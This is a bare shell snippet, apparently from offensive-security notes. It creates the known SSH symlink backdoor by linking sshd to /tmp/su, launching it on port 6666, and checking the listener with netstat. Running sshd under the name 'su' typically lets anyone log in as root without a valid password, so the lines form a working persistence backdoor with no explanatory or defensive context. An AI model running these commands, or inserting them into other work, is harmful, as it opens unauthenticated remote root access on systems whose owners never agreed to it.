netstat -tulnp | grep "6666"
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=6666;
netstat -tulnp | grep "6666"
